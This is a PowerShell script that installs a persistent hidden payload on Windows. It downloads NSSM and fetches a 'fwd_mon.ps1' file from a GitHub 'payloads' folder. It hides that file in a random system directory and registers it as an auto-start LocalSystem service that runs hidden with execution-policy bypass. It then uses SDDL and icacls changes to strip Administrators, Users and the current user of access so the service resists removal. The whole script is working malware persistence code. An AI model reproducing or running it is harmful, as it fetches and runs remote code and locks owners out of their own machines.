param(
    [string]$basePath
)

$paths = @(
    "$env:windir\system32\config\systemprofile\AppData\Local",
    "$env:windir\System32\WindowsPowerShell\v1.0\Modules",
    "$env:windir\System32\drivers\etc",
    "$env:windir\WinSxS"
)

$nssmUrl = "https://nssm.cc/release/nssm-2.24.zip"
$nssmFolder = "$env:windir\system32\wbem\nssm"
$nssmexe = "$nssmFolder\nssm.exe"
$fwdmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
$fwdmonPath = "$fwdmonPath\fwd_mon.ps1"
$serviceName = "MyfwdmonService"
$exepath = "powershell.exe"
$arguments = "-ep bypass -nop -w hidden $fwdmonPath -basePath $basePath"
$downloadPath = "$env:temp\nssm.zip"

if(-not(Test-Path -Path $nssmFolder -PathType Container)){
    New-Item -Path $nssmFolder -ItemType Directory -Force
}

if(-not(Test-Path -Path $nssmexe)){
    if(-not(Test-Path -Path $downloadPath)){
        iwr -Uri $nssmUrl -OutFile $downloadPath
    }
    Expand-Archive -Path $downloadPath -DestinationPath $env:temp
    Move-Item -Path "$env:temp\nssm-2.24\win64\nssm.exe" -Destination $nssmexe -Force
}

if(-not(Test-Path -Path $fwdmonPath -PathType Leaf)){
    iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/fwd_mon.ps1" -OutFile $fwdmonPath
}

Remove-Item -Path $downloadPath -Force -Recurse
Remove-Item -Path "$env:temp\nssm-2.24" -Force -Recurse

if(Get-Service -Name $serviceName -ErrorAction SilentlyContinue){
    & $nssmexe stop $serviceName
    & $nssmexe remove $serviceName confirm
}

& $nssmexe install $serviceName $exePath $arguments
& $nssmexe set $serviceName Start SERVICE_AUTO_START
& $nssmexe set $serviceName ObjectName "LocalSystem"
& $nssmexe set $serviceName AppExit Default Exit
& $nssmexe set $serviceName AppExit 0 Exit
& $nssmexe set $serviceName AppPriority REALTIME_PRIORITY_CLASS
& $nssmexe set $serviceName AppStdout "$env:userprofile\fwdmon_srv.log"
& $nssmexe set $serviceName AppStderr "$env:userprofile\fwdmon_srv.log.error"
& $nssmexe start $serviceName

$SDDL = "O:SYD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)"
sc.exe sdset $serviceName $SDDL

takeown /F $nssmFolder /A /R /D Y 2>&1 | Out-Null
takeown /F $fwdmonPath /A /R /D Y 2>&1 | Out-Null

#  Set SYSTEM as owner (prevents inheritance)
icacls $nssmFolder /setowner "NT AUTHORITY\SYSTEM" /T /Q 2>&1 | Out-Null
icacls $fwdmonPath /setowner "NT AUTHORITY\SYSTEM" /T /Q 2>&1 | Out-Null

# Remove inheritance and grant SYSTEM full control
icacls $nssmFolder /grant:r "NT AUTHORITY\SYSTEM:F" /T /Q 2>&1 | Out-Null
icacls $nssmFolder /inheritance:r /grant:r "NT AUTHORITY\SYSTEM:F" /T /Q 2>&1 | Out-Null
icacls $fwdmonPath /grant:r "NT AUTHORITY\SYSTEM:F" /T /Q 2>&1 | Out-Null
icacls $fwdmonPath /inheritance:r /grant:r "NT AUTHORITY\SYSTEM:F" /T /Q 2>&1 | Out-Null

# Remov all other users/groups (optional safety measure)
icacls $nssmFolder /remove "Administrators" "Users" "Authenticated Users" "Everyone" /T /Q 2>&1 | Out-Null
icacls $nssmFolder /remove:g "BUILTIN\Administrators" "BUILTIN\Users" "Everyone" "NT AUTHORITY\Authenticated Users" /T /Q 2>&1 | Out-Null
icacls $fwdmonPath /remove "Administrators" "Users" "Authenticated Users" "Everyone" /T /Q 2>&1 | Out-Null
icacls $fwdmonPath /remove:g "BUILTIN\Administrators" "BUILTIN\Users" "Everyone" "NT AUTHORITY\Authenticated Users" /T /Q 2>&1 | Out-Null

# 4. Explicitly remove your user account
icacls $nssmFolder /remove:g "$env:computername\$env:username" /T /Q 2>&1 | Out-Null
icacls $fwdmonPath /remove:g "$env:computername\$env:username" /T /Q 2>&1 | Out-Null


#attrib +h +s +r $nssmFolder
#attrib +h +s +r $fwdmonPath